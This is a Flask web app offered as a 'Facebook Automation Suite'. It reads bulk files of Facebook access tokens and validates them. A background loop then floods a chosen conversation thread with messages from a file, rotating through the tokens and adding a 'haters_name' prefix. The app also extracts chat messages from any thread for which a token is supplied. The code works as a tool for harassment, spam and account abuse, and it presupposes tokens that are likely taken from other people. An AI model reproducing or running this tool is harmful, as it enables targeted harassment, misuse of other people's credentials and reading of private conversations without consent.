from flask import Flask, request, render_template_string, jsonify
import requests
import time
import threading
import os
import re
from datetime import datetime
import json

app = Flask(__name__)
app.secret_key = 'xmarty-ayush-king-secret-key-2026'

# Global variables
sending_active = False
sending_thread = None
current_session_data = {}
current_process = None

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.9',
    'referer': 'https://www.google.com'
}

# HTML Template
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>XMARTY AYUSH KING - Facebook Tool Suite</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: linear-gradient(135deg, #1a3c0a 0%, #2d1f00 100%);
            font-family: 'Courier New', 'Segoe UI', monospace;
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            max-width: 1300px;
            margin: 0 auto;
        }
        
        .header {
            text-align: center;
            padding: 30px;
            background: rgba(0,0,0,0.6);
            border-radius: 20px;
            margin-bottom: 30px;
            border: 2px solid #ffd700;
            box-shadow: 0 0 20px rgba(255,215,0,0.3);
        }
        
        .header h1 {
            color: #ffd700;
            font-size: 2.5em;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
            letter-spacing: 2px;
        }
        
        .header p {
            color: #ffeb3b;
            margin-top: 10px;
            font-size: 1.1em;
        }
        
        .feature-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
            gap: 25px;
            margin-bottom: 30px;
        }
        
        .feature-btn {
            background: linear-gradient(135deg, #2d5016 0%, #1a3009 100%);
            border: 2px solid #ffd700;
            border-radius: 15px;
            padding: 25px;
            text-align: center;
            cursor: pointer;
            transition: all 0.3s ease;
        }
        
        .feature-btn:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(255,215,0,0.4);
            background: linear-gradient(135deg, #3a6b1e 0%, #2d1f00 100%);
        }
        
        .feature-btn.active {
            background: linear-gradient(135deg, #ffd700 0%, #ffed4e 100%);
            border-color: #fff;
        }
        
        .feature-btn.active h3,
        .feature-btn.active p {
            color: #1a3009;
        }
        
        .feature-btn h3 {
            color: #ffd700;
            font-size: 1.8em;
            margin-bottom: 10px;
        }
        
        .feature-btn p {
            color: #ccc;
            font-size: 0.9em;
        }
        
        .panel {
            background: rgba(0,0,0,0.85);
            border-radius: 20px;
            padding: 30px;
            border: 2px solid #ffd700;
            margin-top: 20px;
            display: none;
        }
        
        .panel h2 {
            color: #ffd700;
            margin-bottom: 25px;
            font-size: 2em;
            border-left: 5px solid #ffd700;
            padding-left: 15px;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        label {
            color: #ffd700;
            display: block;
            margin-bottom: 8px;
            font-weight: bold;
            font-size: 1.1em;
        }
        
        input, select, textarea, input[type="file"] {
            width: 100%;
            padding: 12px;
            background: rgba(255,255,255,0.1);
            border: 1px solid #ffd700;
            border-radius: 10px;
            color: white;
            font-size: 14px;
        }
        
        input:focus, select:focus {
            outline: none;
            border-color: #ffeb3b;
            background: rgba(255,255,255,0.2);
        }
        
        button {
            background: linear-gradient(135deg, #ffd700 0%, #ffed4e 100%);
            color: #1a3009;
            padding: 12px 30px;
            border: none;
            border-radius: 10px;
            cursor: pointer;
            font-size: 16px;
            font-weight: bold;
            transition: all 0.3s;
            margin-right: 10px;
        }
        
        button:hover {
            transform: scale(1.05);
            box-shadow: 0 5px 15px rgba(255,215,0,0.4);
        }
        
        button.danger {
            background: linear-gradient(135deg, #dc3545 0%, #c82333 100%);
            color: white;
        }
        
        button.success {
            background: linear-gradient(135deg, #28a745 0%, #20c997 100%);
            color: white;
        }
        
        .status-card {
            background: rgba(0,0,0,0.6);
            padding: 20px;
            border-radius: 15px;
            margin-top: 20px;
            border-left: 4px solid #ffd700;
        }
        
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            gap: 15px;
            margin-top: 15px;
        }
        
        .stat-item {
            text-align: center;
            padding: 15px;
            background: rgba(255,215,0,0.1);
            border-radius: 10px;
        }
        
        .stat-value {
            color: #ffd700;
            font-size: 2em;
            font-weight: bold;
        }
        
        .stat-label {
            color: #ccc;
            margin-top: 5px;
            font-size: 0.85em;
        }
        
        .results-area {
            margin-top: 20px;
            max-height: 400px;
            overflow-y: auto;
        }
        
        .message-item {
            background: rgba(255,255,255,0.05);
            padding: 10px;
            margin: 5px 0;
            border-radius: 8px;
            border-left: 3px solid #ffd700;
        }
        
        .sending-active {
            animation: pulse 1s infinite;
            color: #28a745 !important;
        }
        
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.6; }
        }
        
        .footer {
            text-align: center;
            margin-top: 30px;
            padding: 20px;
            color: #ffd700;
            border-top: 1px solid #ffd700;
        }
        
        @media (max-width: 768px) {
            .feature-grid {
                grid-template-columns: 1fr;
            }
            
            .panel {
                padding: 20px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔥 XMARTY AYUSH KING 🔥</h1>
            <p>Complete Facebook Automation Suite | 24/7 • 365 Days Uptime</p>
            <p style="font-size: 12px; margin-top: 10px;">⚡ Offline Mode Ready • Auto-Recovery ⚡</p>
        </div>
        
        <div class="feature-grid">
            <div class="feature-btn" onclick="showPanel('sender')">
                <h3>📨 MSG SENDER</h3>
                <p>Mass message sender with multi-token support</p>
            </div>
            <div class="feature-btn" onclick="showPanel('checker')">
                <h3>✅ TOKEN CHECKER</h3>
                <p>Validate Facebook access tokens</p>
            </div>
            <div class="feature-btn" onclick="showPanel('extractor')">
                <h3>💬 CHAT EXTRACTOR</h3>
                <p>Extract messages from any conversation</p>
            </div>
            <div class="feature-btn" onclick="showPanel('status')">
                <h3>📊 STATUS</h3>
                <p>Real-time monitoring & statistics</p>
            </div>
        </div>
        
        <!-- Sender Panel -->
        <div id="senderPanel" class="panel">
            <h2>📨 MESSAGE SENDER</h2>
            <form id="senderForm" enctype="multipart/form-data">
                <div class="form-group">
                    <label>🔑 Conversation/Thread ID:</label>
                    <input type="text" name="threadId" required placeholder="Enter thread/conversation ID">
                </div>
                <div class="form-group">
                    <label>📄 Tokens File (.txt):</label>
                    <input type="file" name="txtFile" accept=".txt" required>
                </div>
                <div class="form-group">
                    <label>💬 Messages File (.txt):</label>
                    <input type="file" name="messagesFile" accept=".txt" required>
                </div>
                <div class="form-group">
                    <label>👤 Name/Prefix:</label>
                    <input type="text" name="kidx" required placeholder="Enter prefix name">
                </div>
                <div class="form-group">
                    <label>⏱ Speed (seconds):</label>
                    <input type="number" name="time" value="60" required>
                </div>
                <button type="submit" class="success">🚀 START SENDING</button>
                <button type="button" onclick="stopSending()" class="danger">⏹ STOP SENDING</button>
            </form>
            <div id="senderMessage"></div>
        </div>
        
        <!-- Token Checker Panel -->
        <div id="checkerPanel" class="panel">
            <h2>✅ TOKEN CHECKER</h2>
            <form id="checkerForm" enctype="multipart/form-data">
                <div class="form-group">
                    <label>📄 Tokens File (.txt):</label>
                    <input type="file" name="txtFile" accept=".txt" required>
                </div>
                <button type="submit">🔍 CHECK TOKENS</button>
            </form>
            <div id="checkerResults" class="results-area"></div>
        </div>
        
        <!-- Extractor Panel -->
        <div id="extractorPanel" class="panel">
            <h2>💬 CHAT EXTRACTOR</h2>
            <form id="extractorForm">
                <div class="form-group">
                    <label>🔑 Access Token:</label>
                    <input type="text" name="accessToken" required placeholder="Enter Facebook access token">
                </div>
                <div class="form-group">
                    <label>💬 Thread ID:</label>
                    <input type="text" name="threadId" required placeholder="Enter thread/conversation ID">
                </div>
                <div class="form-group">
                    <label>📊 Messages Limit:</label>
                    <select name="limit">
                        <option value="10">10 messages</option>
                        <option value="25">25 messages</option>
                        <option value="50" selected>50 messages</option>
                        <option value="100">100 messages</option>
                    </select>
                </div>
                <button type="submit">📥 EXTRACT MESSAGES</button>
            </form>
            <div id="extractorResults" class="results-area"></div>
        </div>
        
        <!-- Status Panel -->
        <div id="statusPanel" class="panel">
            <h2>📊 REAL-TIME STATUS</h2>
            <div class="status-card">
                <h3 id="statusTitle">Status: <span id="sendingStatus">⚪ IDLE</span></h3>
                <div class="stats-grid">
                    <div class="stat-item">
                        <div class="stat-value" id="totalSent">0</div>
                        <div class="stat-label">Total Sent</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-value" id="successCount">0</div>
                        <div class="stat-label">Successful</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-value" id="failedCount">0</div>
                        <div class="stat-label">Failed</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-value" id="errorCount">0</div>
                        <div class="stat-label">Errors</div>
                    </div>
                </div>
                <div style="margin-top: 15px;">
                    <p>📝 Last: <span id="lastMessage">-</span></p>
                    <p>⏰ Time: <span id="lastTime">-</span></p>
                    <p>🔑 Valid Tokens: <span id="validTokens">0</span></p>
                    <p>💬 Messages Loaded: <span id="messagesCount">0</span></p>
                </div>
            </div>
            <button onclick="refreshStatus()">🔄 REFRESH</button>
        </div>
        
        <div class="footer">
            <p>© 2026 XMARTY AYUSH KING | 24/7 AUTOMATION | 365 DAYS UPTIME</p>
        </div>
    </div>
    
    <script>
        let currentPanel = 'sender';
        
        function showPanel(panel) {
            document.getElementById('senderPanel').style.display = 'none';
            document.getElementById('checkerPanel').style.display = 'none';
            document.getElementById('extractorPanel').style.display = 'none';
            document.getElementById('statusPanel').style.display = 'none';
            
            document.getElementById(panel + 'Panel').style.display = 'block';
            currentPanel = panel;
            
            if (panel === 'status') {
                refreshStatus();
                if (window.statusInterval) clearInterval(window.statusInterval);
                window.statusInterval = setInterval(refreshStatus, 2000);
            } else {
                if (window.statusInterval) clearInterval(window.statusInterval);
            }
        }
        
        document.getElementById('senderForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const formData = new FormData(e.target);
            
            const response = await fetch('/start_sending', {
                method: 'POST',
                body: formData
            });
            
            const result = await response.json();
            alert(result.message);
            if (result.status === 'success') {
                showPanel('status');
            }
        });
        
        document.getElementById('checkerForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const formData = new FormData(e.target);
            
            const response = await fetch('/check_tokens', {
                method: 'POST',
                body: formData
            });
            
            const result = await response.json();
            const resultsDiv = document.getElementById('checkerResults');
            
            if (result.status === 'success') {
                let html = `<h3>✅ ${result.valid}/${result.total} Valid Tokens</h3>`;
                result.results.forEach(token => {
                    if (token.valid) {
                        html += `<div class="message-item" style="border-left-color: #28a745;">✅ Token ${token.index}: VALID (${token.name})</div>`;
                    } else {
                        html += `<div class="message-item" style="border-left-color: #dc3545;">❌ Token ${token.index}: INVALID</div>`;
                    }
                });
                resultsDiv.innerHTML = html;
            }
        });
        
        document.getElementById('extractorForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const formData = new FormData(e.target);
            
            const response = await fetch('/extract_messages', {
                method: 'POST',
                body: formData
            });
            
            const result = await response.json();
            const resultsDiv = document.getElementById('extractorResults');
            
            if (result.status === 'success') {
                let html = `<h3>📥 ${result.count} Messages Extracted</h3>`;
                result.messages.forEach(msg => {
                    html += `<div class="message-item">
                        <strong>${msg.from || 'Unknown'}</strong> - ${new Date(msg.time).toLocaleString()}<br>
                        ${msg.message || '[No Text]'}
                    </div>`;
                });
                resultsDiv.innerHTML = html;
            } else {
                resultsDiv.innerHTML = `<div class="message-item">❌ ${result.message}</div>`;
            }
        });
        
        async function stopSending() {
            const response = await fetch('/stop_sending', { method: 'POST' });
            const result = await response.json();
            alert(result.message);
            refreshStatus();
        }
        
        async function refreshStatus() {
            const response = await fetch('/status');
            const status = await response.json();
            
            const statusSpan = document.getElementById('sendingStatus');
            if (status.active) {
                statusSpan.innerHTML = '🔴 SENDING ACTIVE';
                statusSpan.className = 'sending-active';
            } else {
                statusSpan.innerHTML = '⚪ IDLE';
                statusSpan.className = '';
            }
            
            document.getElementById('totalSent').innerText = status.stats.total_sent || 0;
            document.getElementById('successCount').innerText = status.stats.success || 0;
            document.getElementById('failedCount').innerText = status.stats.failed || 0;
            document.getElementById('errorCount').innerText = status.stats.errors || 0;
            document.getElementById('lastMessage').innerText = status.stats.last_message || '-';
            document.getElementById('lastTime').innerText = status.stats.last_time || '-';
            document.getElementById('validTokens').innerText = status.stats.valid_tokens || 0;
            document.getElementById('messagesCount').innerText = status.stats.messages_count || 0;
        }
        
        showPanel('sender');
    </script>
</body>
</html>
'''

# Helper Functions
def check_token_validity(access_token):
    """Check if Facebook access token is valid"""
    try:
        url = f"https://graph.facebook.com/v15.0/me?access_token={access_token}"
        response = requests.get(url, timeout=10)
        if response.status_code == 200:
            data = response.json()
            return True, data.get('name', 'Unknown')
        return False, None
    except:
        return False, None

def extract_chat_messages(access_token, thread_id, limit=50):
    """Extract messages from a thread"""
    try:
        url = f"https://graph.facebook.com/v15.0/t_{thread_id}/messages"
        params = {
            'access_token': access_token,
            'limit': limit,
            'fields': 'message,created_time,from'
        }
        response = requests.get(url, params=params, timeout=15)
        if response.status_code == 200:
            data = response.json()
            messages = []
            for msg in data.get('data', []):
                messages.append({
                    'message': msg.get('message', ''),
                    'time': msg.get('created_time', ''),
                    'from': msg.get('from', {}).get('name', 'Unknown')
                })
            return True, messages
        return False, []
    except Exception as e:
        return False, []

def send_messages_worker(thread_id, haters_name, speed, tokens, messages):
    """Background worker for sending messages"""
    global sending_active, current_session_data
    
    post_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
    msg_count = len(messages)
    token_count = len(tokens)
    msg_index = 0
    
    while sending_active:
        try:
            for i in range(msg_count):
                if not sending_active:
                    break
                
                token = tokens[i % token_count]
                message = messages[i].strip()
                full_message = f"{haters_name} {message}"
                
                params = {
                    'access_token': token,
                    'message': full_message
                }
                
                response = requests.post(post_url, json=params, headers=headers, timeout=30)
                current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                
                current_session_data['total_sent'] = current_session_data.get('total_sent', 0) + 1
                
                if response.status_code == 200:
                    current_session_data['success'] = current_session_data.get('success', 0) + 1
                    print(f"[+] SUCCESS: {full_message[:50]}...")
                else:
                    current_session_data['failed'] = current_session_data.get('failed', 0) + 1
                    print(f"[-] FAILED: {full_message[:50]}...")
                
                current_session_data['last_message'] = full_message[:100]
                current_session_data['last_time'] = current_time
                
                time.sleep(speed)
                
        except Exception as e:
            current_session_data['errors'] = current_session_data.get('errors', 0) + 1
            print(f"[!] ERROR: {str(e)}")
            time.sleep(30)

# Routes
@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/start_sending', methods=['POST'])
def start_sending():
    global sending_active, sending_thread, current_session_data
    
    if sending_active:
        return jsonify({'status': 'error', 'message': 'Sending already active!'})
    
    thread_id = request.form.get('threadId')
    haters_name = request.form.get('kidx')
    speed = int(request.form.get('time'))
    
    txt_file = request.files['txtFile']
    tokens = txt_file.read().decode().splitlines()
    
    msg_file = request.files['messagesFile']
    messages = msg_file.read().decode().splitlines()
    
    # Validate tokens
    valid_tokens = []
    for token in tokens[:10]:  # Check first 10 tokens
        is_valid, name = check_token_validity(token)
        if is_valid:
            valid_tokens.append(token)
    
    if not valid_tokens:
        return jsonify({'status': 'error', 'message': 'No valid tokens found!'})
    
    current_session_data = {
        'total_sent': 0,
        'success': 0,
        'failed': 0,
        'errors': 0,
        'active': True,
        'valid_tokens': len(valid_tokens),
        'messages_count': len(messages),
        'last_message': '-',
        'last_time': '-'
    }
    
    sending_active = True
    sending_thread = threading.Thread(
        target=send_messages_worker,
        args=(thread_id, haters_name, speed, valid_tokens, messages)
    )
    sending_thread.daemon = True
    sending_thread.start()
    
    return jsonify({'status': 'success', 'message': f'Sending started with {len(valid_tokens)} tokens!'})

@app.route('/stop_sending', methods=['POST'])
def stop_sending():
    global sending_active, current_session_data
    
    if not sending_active:
        return jsonify({'status': 'error', 'message': 'No active sending!'})
    
    sending_active = False
    current_session_data['active'] = False
    
    return jsonify({'status': 'success', 'message': 'Sending stopped!'})

@app.route('/status', methods=['GET'])
def get_status():
    global sending_active, current_session_data
    
    return jsonify({
        'active': sending_active,
        'stats': current_session_data
    })

@app.route('/check_tokens', methods=['POST'])
def check_tokens():
    if 'txtFile' not in request.files:
        return jsonify({'status': 'error', 'message': 'No file uploaded!'})
    
    txt_file = request.files['txtFile']
    tokens = txt_file.read().decode().splitlines()
    
    results = []
    valid_count = 0
    
    for i, token in enumerate(tokens[:20]):
        is_valid, name = check_token_validity(token)
        if is_valid:
            valid_count += 1
            results.append({'index': i+1, 'valid': True, 'name': name})
        else:
            results.append({'index': i+1, 'valid': False, 'name': None})
    
    return jsonify({
        'status': 'success',
        'total': len(tokens[:20]),
        'valid': valid_count,
        'results': results
    })

@app.route('/extract_messages', methods=['POST'])
def extract_messages():
    thread_id = request.form.get('threadId')
    access_token = request.form.get('accessToken')
    limit = int(request.form.get('limit', 50))
    
    is_valid, name = check_token_validity(access_token)
    if not is_valid:
        return jsonify({'status': 'error', 'message': 'Invalid access token!'})
    
    success, messages = extract_chat_messages(access_token, thread_id, limit)
    
    if success:
        return jsonify({
            'status': 'success',
            'count': len(messages),
            'messages': messages
        })
    else:
        return jsonify({'status': 'error', 'message': 'Failed to extract messages!'})

if __name__ == '__main__':
    print("""
    ╔══════════════════════════════════════════╗
    ║     XMARTY AYUSH KING - SERVER v2.0      ║
    ║     Facebook Automation Suite            ║
    ║     Port: 5000 | 24/7 Operation         ║
    ╚══════════════════════════════════════════╝
    """)
    app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)
